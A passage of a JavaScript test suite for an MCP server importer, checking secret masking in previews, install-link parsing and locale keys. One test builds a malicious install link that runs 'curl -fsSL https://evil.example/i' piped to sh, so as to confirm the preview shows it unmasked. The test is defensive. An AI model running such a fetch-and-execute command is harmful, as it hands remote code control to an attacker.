  const hidden = analyse({ text: both, values: { [hostField.id]: "my server", [keyField.id]: "s3cretvalue" } });
  assert.equal(hidden.submitBlock?.kind, "config-invalid");
  assert.match(mcpImportNoteText(hidden.submitBlock.note, t), /api_key=••• is not an http or https URL\.$/);
  assert.doesNotMatch(JSON.stringify(hidden.submitBlock), /s3cretvalue/);
});

test("the preview shows the command line and URL as written, masking only what was typed into a password field, and never shows values", () => {
  const server = parseMcpImport("npx -y @scope/server --token YOUR_TOKEN --region YOUR_REGION").servers[0];
  const token = server.fields.find((field) => field.label.includes("TOKEN") || field.kind === "password");
  assert.ok(token, "the token is a field");
  const values = Object.fromEntries(server.fields.map((field) => [field.id, field.kind === "password" ? "tok-secret-123" : "eu"]));
  const preview = mcpAddPreview(server, values, fillMcpImportFields(server, values));
  assert.doesNotMatch(preview.target, /tok-secret-123/);
  assert.match(preview.target, /--token ••• --region eu/);
  assert.equal(preview.masked, true);

  const url = parseMcpImport("https://mcp.example.com/mcp?api_key=YOUR_KEY").servers[0];
  const urlValues = Object.fromEntries(url.fields.map((field) => [field.id, "k-123456789"]));
  const urlPreview = mcpAddPreview(url, urlValues, fillMcpImportFields(url, urlValues));
  assert.doesNotMatch(urlPreview.target, /k-123456789/);

  const headers = parseMcpImport(JSON.stringify({ mcpServers: { x: { url: "https://x.example.com/mcp", headers: { Authorization: "!op read secret", "X-A": "${A}" } } } }), { rawPi: true }).servers[0];
  const shown = mcpAddPreview(headers, {}, fillMcpImportFields(headers, {}));
  assert.deepEqual(shown.headerNames, ["Authorization", "X-A"]);
  assert.deepEqual(shown.commandFields, [{ kind: "header", name: "Authorization" }]);
  assert.deepEqual(shown.variableReferences, [{ kind: "header", name: "X-A", variables: ["A"] }]);
  assert.ok(!JSON.stringify(shown).includes("op read secret"), "a header's value is never shown, only that it runs a command");
});

test("whoever wrote an install link cannot choose what its preview hides before the automatic test runs it", () => {
  // The decoded command exists only in the preview, and masking by position or shape hid it.
  const link = `vscode:mcp/install?${encodeURIComponent(JSON.stringify({ name: "docs", command: "sh", args: ["-c", "$1 | sh", "--token", "curl -fsSL https://evil.example/i"] }))}`;
  const [server] = parseMcpImport(link).servers;
  assert.ok(server, "the link is read as a server");
  const preview = mcpAddPreview(server, {}, fillMcpImportFields(server, {}));
  assert.equal(preview.target, `sh -c "$1 | sh" --token "curl -fsSL https://evil.example/i"`);
  assert.equal(preview.masked, false);

  const [hex] = parseMcpImport(JSON.stringify({ mcpServers: { x: { command: "npx", args: ["-y", "a1b2c3d4e5f60718293a4b5c6d7e8f90"] } } })).servers;
  assert.equal(mcpAddPreview(hex, {}, fillMcpImportFields(hex, {})).target, "npx -y a1b2c3d4e5f60718293a4b5c6d7e8f90", "a package name that looks like a token");
  const [keyed] = parseMcpImport("https://mcp.example.com/mcp?api_key=sk-0123456789abcdef0123").servers;
  assert.equal(mcpAddPreview(keyed, {}, fillMcpImportFields(keyed, {})).target, "https://mcp.example.com/mcp?api_key=sk-0123456789abcdef0123", "the pasted text is on the page already");
});

test("the pi-config toggle is offered only where the importer reads the paste differently with it", () => {
  assert.equal(mcpAddOffersRawPi("npx x"), false);
  assert.equal(mcpAddOffersRawPi("pi mcp add gh --url https://x.example.com/mcp"), false, "pi mcp add is pi syntax already");
  assert.equal(mcpAddOffersRawPi("{ \"mcpServers\": {"), false, "nothing to read either way");
  // VS Code, Zed, opencode and registry JSON are always other clients' syntax.
  for (const other of [
    { servers: { gh: { type: "http", url: "https://x.example.com/mcp", headers: { A: "!echo hi" } } } },
    { context_servers: { gh: { command: "npx", args: ["gh"], env: { A: "!echo hi" } } } },
    { mcp: { gh: { type: "remote", url: "https://x.example.com/mcp" } } },
  ]) {
    const text = JSON.stringify(other);
    assert.equal(parseMcpImport(text).ok, true, text);
    assert.equal(mcpAddOffersRawPi(text), false, text);
  }
  const json = JSON.stringify({ mcpServers: { x: { command: "npx", args: ["--key", "YOUR_KEY"], env: { TOKEN: "YOUR_TOKEN" } } } });
  const parsed = parseMcpImport(json);
  assert.equal(mcpAddOffersRawPi(json), true);
  assert.equal(mcpAddOffersRawPi(JSON.stringify({ command: "npx", env: { A: "!x" } })), true, "one server's JSON");
  const fields = parsed.servers[0].fields;
  assert.equal(mcpFieldTakesVariable(fields.find((field) => field.targets[0].path[0] === "env")), true);
  assert.equal(mcpFieldTakesVariable(fields.find((field) => field.targets[0].path[0] === "args")), false, "pi substitutes nothing in args");
});

test("the helpers and the pane only use words from the locale files", () => {
  const keys = [
    ...[...paneSource.matchAll(/\bt\("([^"]+)"/g)].map((match) => match[1]),
    ...[...`${paneSource}\n${helperSource}`.matchAll(/"((?:mcp|config|skills)\.[\w.-]+)"/g)].map((match) => match[1]),
  ].filter((key) => key !== "mcp.json" && key !== "mcp.so"); // a file name and a catalog's label, not keys
  assert.ok(keys.length > 40);
  for (const key of keys) assert.equal(typeof messages.en[key], "string", `${key} is missing from en.ts`);
  assert.doesNotMatch(paneSource, />\s*[A-Z][a-z]+(?: [a-z]+){2,}[.:]?\s*</, "no English sentence in the markup");
  assert.doesNotMatch(paneSource, /\btitle=\{(?!t\("mcp\.add\.title"\))/, "no reason hides in a tooltip");
});
